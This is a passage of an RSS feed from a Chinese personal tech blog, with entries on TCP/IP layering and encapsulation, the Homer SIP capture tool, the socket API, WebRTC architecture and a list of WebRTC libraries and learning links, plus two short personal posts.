&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;------------------------------------------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;应用层&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; Telnet, FTP, Email, MySql			&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	  	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;应用程序细节&lt;/span&gt;						  &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;用户进程&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;------------------------------------------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;运输层&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; TCP, UDP                          &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;内核&lt;/span&gt;(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;处理通信细节&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;端到端通信&lt;/span&gt;                          &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;------------------------------------------|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;网络层&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; IP, ICMP, IGMP					&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;逐跳通信，处理分组相关的活动，例如分组选路&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;------------------------------------------|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;链路层&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;设备驱动程序&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;接口卡&lt;/span&gt;				   &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;处理物理信号&lt;/span&gt;						  &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;------------------------------------------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;应用层和传输层使用&lt;strong&gt;端到端&lt;/strong&gt;的协议&lt;/li&gt;
&lt;li&gt;网络层提供&lt;strong&gt;逐跳&lt;/strong&gt;的协议&lt;/li&gt;
&lt;li&gt;网桥在&lt;strong&gt;链路层&lt;/strong&gt;来连接网络&lt;/li&gt;
&lt;li&gt;路由器在&lt;strong&gt;网络层&lt;/strong&gt;连接网络&lt;/li&gt;
&lt;li&gt;以太网数据帧的物理特性是长度必须在&lt;strong&gt;46-1500&lt;/strong&gt;字节之间&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;封装&#34;&gt;封装&lt;/h1&gt;
&lt;p&gt;以太网帧用来封装IP数据报。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IP数据报 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; IP首部&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;20字节&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; + TCP首部&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;20字节&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; + 应用数据  &lt;span style=&#34;color:#75715e&#34;&gt;# 针对TCP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IP数据报 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; IP首部&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;20字节&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; + UDP首部&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;8字节&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; + 应用数据 &lt;span style=&#34;color:#75715e&#34;&gt;# 针对UDP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;以太网帧 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 以太网首部&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;14字节&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; + IP数据报&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;46-1500字节&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; + 以太网尾部&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;4字节&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;IP数据报最大为1500字节，减去20字节IP首部，8字节UDP首部，留给UDP应用数据的只有1472字节。&lt;/p&gt;</description>
    </item>
    <item>
      <title>homer: 统一的sip包集中处理工具</title>
      <link>https://wdd.js.org/opensips/tools/homer/</link>
      <pubDate>Tue, 26 Nov 2019 19:58:54 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/tools/homer/</guid>
      <description>&lt;p&gt;相比于sngrep, Homer能够保存从历史记录中搜索SIP包信息。除此以外，Homer可以很方便的与OpenSIPS或FS进行集成。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/tools/homer/2022-12-02-17-12-43.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;最精简版本的Homer部署需要三个服务。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;postgres 数据库，用来存储SIP信息&lt;/li&gt;
&lt;li&gt;heplify-server 用来处理Hep消息，存储到数据库&lt;/li&gt;
&lt;li&gt;homer-app 前端搜索查询界面&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这三个服务都可以用docker镜像的方式部署，非常方便。&lt;/p&gt;
&lt;p&gt;说实话：homer实际上并不好用。你可以对比一下siphub就知道了。&lt;/p&gt;
&lt;h1 id=&#34;参考资料&#34;&gt;参考资料&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.opensips.org/2017/03/22/capturing-beyond-sip/&#34;&gt;https://blog.opensips.org/2017/03/22/capturing-beyond-sip/&lt;/a&gt;&lt;!-- raw HTML omitted --&gt;&lt;a href=&#34;https://www.opensips.org/Documentation/Tutorials-Tracing&#34;&gt;https://www.opensips.org/Documentation/Tutorials-Tracing&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>技巧1</title>
      <link>https://wdd.js.org/network/kttu4i/</link>
      <pubDate>Mon, 25 Nov 2019 20:24:24 +0800</pubDate>
      <guid>https://wdd.js.org/network/kttu4i/</guid>
      <description>&lt;h1 id=&#34;1-面向连接和面向非连接的区别&#34;&gt;1 面向连接和面向非连接的区别？&lt;/h1&gt;
&lt;p&gt;面向连接与面向非连接并不是指的物理介质，而是指的分组数据包。而实际上，连接只是一个虚拟的概念。&lt;/p&gt;
&lt;p&gt;数据在发送前，会被分组发送。对于面向连接的协议来说，每个分组之间都有顺序的，分组会存储自己的位置信息。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以理解在同一时间只维持一段关系。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/kttu4i/2022-10-29-18-34-49.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;面向非连接协议，分组直接并无任何关系，每个分组都是相互独立的。&lt;strong&gt;可以理解为脚踏多条船。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/kttu4i/2022-10-29-18-35-03.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>基本套接字API回顾</title>
      <link>https://wdd.js.org/network/base-socket/</link>
      <pubDate>Mon, 25 Nov 2019 20:06:16 +0800</pubDate>
      <guid>https://wdd.js.org/network/base-socket/</guid>
      <description>&lt;h1 id=&#34;套接字api&#34;&gt;套接字API&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SOCKET &lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; domain, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; type, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; protocol)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Socket API和协议无关，即可以用来创建Socket，无论是TCP还是UDP，还是进程间的通信，都可以用这个接口创建。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;domain 表示通信域，最长见的有以下两个域
&lt;ul&gt;
&lt;li&gt;AF_INET 因特网通信&lt;/li&gt;
&lt;li&gt;AF_LOCAL 进程间通信&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;type 表示套接字的类型
&lt;ul&gt;
&lt;li&gt;SOCK_STREAM 可靠的、全双工、面向连接的，实际上就是我们熟悉的TCP&lt;/li&gt;
&lt;li&gt;SOCK_DGRAM 不可靠、尽力而为的，无连接的。实际上指的就是UDP&lt;/li&gt;
&lt;li&gt;SOCK_RAW 允许对IP层的数据进行访问。用于特殊目的，例如ICMP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;protocol 表示具体通信协议&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;TCP/IP 本自同根生！&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>所有的古镇都是一个样[todo]</title>
      <link>https://wdd.js.org/posts/2019/11/bhbmum/</link>
      <pubDate>Sat, 23 Nov 2019 12:12:58 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/11/bhbmum/</guid>
      <description></description>
    </item>
    <item>
      <title>买了语雀会员是怎样体验？</title>
      <link>https://wdd.js.org/posts/2019/11/gonmzq/</link>
      <pubDate>Sat, 23 Nov 2019 11:55:06 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/11/gonmzq/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/11/gonmzq/2022-10-29-19-52-43.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;今天打开语雀，发现已经有了会员功能。说实在的，相比普通用户，会员的优势并不大。除非你是哪种重度文字控患者，10个知识库并不够你用了。&lt;/p&gt;
&lt;p&gt;我在出现会员服务之前，已经有了多于10个知识库。&lt;/p&gt;
&lt;p&gt;相比于免费服务，我更喜欢付费的服务。&lt;strong&gt;免费的服务永远是最贵的服务。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;很多人，可以买爱奇艺的会员、优酷视频、腾讯视频、京东会员，但是往往对于能够真正提升自己能力的投资，往往安于免费，不忍付出。&lt;/p&gt;
&lt;p&gt;除非是动辄几千的会员，我会考虑自己是否真正需要。一百左右的年费会员，在上海，也就是喝三四杯奶茶的价钱。&lt;/p&gt;
&lt;p&gt;所以，我就买了会员。&lt;/p&gt;
&lt;p&gt;买了会员有什么感觉，感觉我可能会多创建几个知识库吧。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/11/gonmzq/2022-10-29-19-52-50.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>WebRTC简介</title>
      <link>https://wdd.js.org/opensips/ch9/notes/</link>
      <pubDate>Sat, 23 Nov 2019 10:51:20 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/notes/</guid>
      <description>&lt;h1 id=&#34;webrtc-功能&#34;&gt;WebRTC 功能&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;音频视频通话&lt;/li&gt;
&lt;li&gt;视频会议&lt;/li&gt;
&lt;li&gt;数据传输&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;webrtc-架构&#34;&gt;WebRTC 架构&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;对等实体之间通过信令服务传递信令&lt;/li&gt;
&lt;li&gt;对等实体之间的媒体流可以直接传递，无需中间服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch9/notes/2022-12-02-15-28-58.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;内部结构&#34;&gt;内部结构&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch9/notes/2022-12-02-15-29-17.png&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;紫色部分是Web开发者API层&lt;/li&gt;
&lt;li&gt;蓝色实线部分是面向浏览器厂商的API层&lt;/li&gt;
&lt;li&gt;蓝色虚线部分浏览器厂商可以自定义实现&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;WebRTC有三个模块：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Voice Engine（音频引擎）
&lt;ul&gt;
&lt;li&gt;Voice Engine包含iSAC/iLBC Codec（音频编解码器，前者是针对宽带和超宽带，后者是针对窄带）&lt;/li&gt;
&lt;li&gt;NetEQ for voice（处理网络抖动和语音包丢失）&lt;/li&gt;
&lt;li&gt;Echo Canceler（回声消除器）/ Noise Reduction（噪声抑制）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Video Engine（视频引擎）
&lt;ul&gt;
&lt;li&gt;VP8 Codec（视频图像编解码器）&lt;/li&gt;
&lt;li&gt;Video jitter buffer（视频抖动缓冲器，处理视频抖动和视频信息包丢失）&lt;/li&gt;
&lt;li&gt;Image enhancements（图像质量增强）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Transport
&lt;ul&gt;
&lt;li&gt;SRTP（安全的实时传输协议，用以音视频流传输）&lt;/li&gt;
&lt;li&gt;Multiplexing（多路复用）&lt;/li&gt;
&lt;li&gt;P2P，STUN+TURN+ICE（用于NAT网络和防火墙穿越的）&lt;/li&gt;
&lt;li&gt;除此之外，安全传输可能还会用到DTLS（数据报安全传输），用于加密传输和密钥协商&lt;/li&gt;
&lt;li&gt;整个WebRTC通信是基于UDP的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;webrtc-如何通信&#34;&gt;WebRTC 如何通信&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;getUserMedia用来捕获本地的语音流或者视频流&lt;/li&gt;
&lt;li&gt;RTCPeerConnection用来代表WebRTC链接，用来处理对等实体之间的流数据&lt;/li&gt;
&lt;li&gt;RTCDataChannel 用来传递各种数据&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;webrtc-的核心组件&#34;&gt;WebRTC 的核心组件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;音视频引擎：OPUS、VP8 / VP9、H264&lt;/li&gt;
&lt;li&gt;传输层协议：底层传输协议为 UDP&lt;/li&gt;
&lt;li&gt;媒体协议：SRTP / SRTCP&lt;/li&gt;
&lt;li&gt;数据协议：DTLS / SCTP&lt;/li&gt;
&lt;li&gt;P2P 内网穿透：STUN / TURN / ICE / Trickle ICE&lt;/li&gt;
&lt;li&gt;信令与 SDP 协商：HTTP / WebSocket / SIP、 Offer Answer 模型&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;webrtc-音频和视频引擎&#34;&gt;WebRTC 音频和视频引擎&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch9/notes/2022-12-02-15-29-33.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>WebRTC学习资料分享</title>
      <link>https://wdd.js.org/opensips/ch9/webrtc-ref/</link>
      <pubDate>Sat, 23 Nov 2019 10:49:56 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/webrtc-ref/</guid>
      <description>&lt;p&gt;目前在做基于WebRTC的语音和视频终端，语音和视频通话的质量都不错。感谢WebRTC，站在巨人的肩膀上，我们可以看得更远。&lt;/p&gt;
&lt;h1 id=&#34;webrtc浏览器兼容性&#34;&gt;WebRTC浏览器兼容性&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch9/webrtc-ref/2022-12-02-15-27-23.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;github-demos&#34;&gt;github demos&lt;/h1&gt;
&lt;p&gt;下面两个都是github项目，项目中有各种WebRTC的demo。除了demo之外，这两个项目的issuese也是非常值得看的，可以解决常见的问题&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://webrtc.github.io/samples/&#34;&gt;https://webrtc.github.io/samples/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/muaz-khan/WebRTC-Experiment&#34;&gt;https://github.com/muaz-khan/WebRTC-Experiment&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;相关资料网站&#34;&gt;相关资料网站&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;webrtc官网： &lt;a href=&#34;https://webrtc.org/&#34;&gt;https://webrtc.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;webrtchacks： &lt;a href=&#34;https://webrtchacks.com/&#34;&gt;https://webrtchacks.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;webrtc官网： &lt;a href=&#34;https://webrtc.org.cn/&#34;&gt;https://webrtc.org.cn/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;webrtc安全相关： &lt;a href=&#34;http://webrtc-security.github.io/&#34;&gt;http://webrtc-security.github.io/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;webrtc谷歌开发者教程： &lt;a href=&#34;https://codelabs.developers.google.com/codelabs/webrtc-web/&#34;&gt;https://codelabs.developers.google.com/codelabs/webrtc-web/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;sdp for webrtc &lt;a href=&#34;https://tools.ietf.org/id/draft-nandakumar-rtcweb-sdp-01.html&#34;&gt;https://tools.ietf.org/id/draft-nandakumar-rtcweb-sdp-01.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;各种资料 &lt;a href=&#34;https://webrtc.org/start/&#34;&gt;https://webrtc.org/start/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.w3.org/TR/webrtc/&#34;&gt;https://www.w3.org/TR/webrtc/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;浏览器内核&#34;&gt;浏览器内核&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;webkit官网：&lt;a href=&#34;https://webkit.org/&#34;&gt;https://webkit.org/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;webrtc相关库&#34;&gt;WebRTC相关库&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;webrtc-adapter &lt;a href=&#34;https://github.com/webrtchacks/adapter&#34;&gt;https://github.com/webrtchacks/adapter&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;webrtc周边js库&#34;&gt;WebRTC周边js库&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;库&lt;/th&gt;
          &lt;th&gt;地址&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Addlive&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://www.addlive.com/platform-overview/&#34;&gt;http://www.addlive.com/platform-overview/&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Apidaze&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://developers.apidaze.io/webrtc&#34;&gt;https://developers.apidaze.io/webrtc&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Bistri&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://developers.bistri.com/webrtc-sdk/#js-sdk&#34;&gt;http://developers.bistri.com/webrtc-sdk/#js-sdk&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Crocodile&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://www.crocodilertc.net/documentation/javascript/&#34;&gt;https://www.crocodilertc.net/documentation/javascript/&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;EasyRTC&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://www.easyrtc.com/docs/&#34;&gt;http://www.easyrtc.com/docs/&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Janus&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://janus.conf.meetecho.com/docs/JS.html&#34;&gt;http://janus.conf.meetecho.com/docs/JS.html&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;JsSIP&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://jssip.net/documentation/&#34;&gt;http://jssip.net/documentation/&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Openclove&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://developer.openclove.com/docs/read/ovxjs_api_doc&#34;&gt;http://developer.openclove.com/docs/read/ovxjs_api_doc&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Oracle&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://docs.oracle.com/cd/E40972_01/doc.70/e49239/index.html&#34;&gt;http://docs.oracle.com/cd/E40972_01/doc.70/e49239/index.html&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Peerjs&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://peerjs.com/docs/#api&#34;&gt;http://peerjs.com/docs/#api&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Phono&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://phono.com/docs&#34;&gt;http://phono.com/docs&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Plivo&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://plivo.com/docs/sdk/web/&#34;&gt;https://plivo.com/docs/sdk/web/&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Pubnub&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://www.pubnub.com/docs/javascript/javascript-sdk.html&#34;&gt;http://www.pubnub.com/docs/javascript/javascript-sdk.html&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Quobis&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://quobis.atlassian.net/wiki/display/QoffeeSIP/API&#34;&gt;https://quobis.atlassian.net/wiki/display/QoffeeSIP/API&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;SimpleWebRTC from &amp;amp;Yet&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://simplewebrtc.com/&#34;&gt;http://simplewebrtc.com/&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;SIPML5&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://sipml5.org/docgen/symbols/SIPml.html&#34;&gt;http://sipml5.org/docgen/symbols/SIPml.html&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;TenHands&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://www.tenhands.net/developer/docs.htm&#34;&gt;https://www.tenhands.net/developer/docs.htm&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;TokBox&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://tokbox.com/opentok&#34;&gt;http://tokbox.com/opentok&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Twilio&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://www.twilio.com/client/api&#34;&gt;http://www.twilio.com/client/api&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Voximplant&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://voximplant.com/docs/references/websdk/&#34;&gt;http://voximplant.com/docs/references/websdk/&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Vline&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;https://vline.com/developer/docs/vline.js/&#34;&gt;https://vline.com/developer/docs/vline.js/&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Weemo&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://docs.weemo.com/js/&#34;&gt;http://docs.weemo.com/js/&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Xirsys&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://xirsys.com/_static_content/xirsys.com/docs/&#34;&gt;http://xirsys.com/_static_content/xirsys.com/docs/&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Xsockets.net&lt;/td&gt;
          &lt;td&gt;&lt;a href=&#34;http://xsockets.net/docs/javascript-client-api&#34;&gt;http://xsockets.net/docs/javascript-client-api&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;voippstn&#34;&gt;VoIP/PSTN&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://kamailio.org/&#34;&gt;https://kamailio.org&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://freeswitch.org/&#34;&gt;https://freeswitch.org/&lt;/a&gt;&lt;/li&gt;
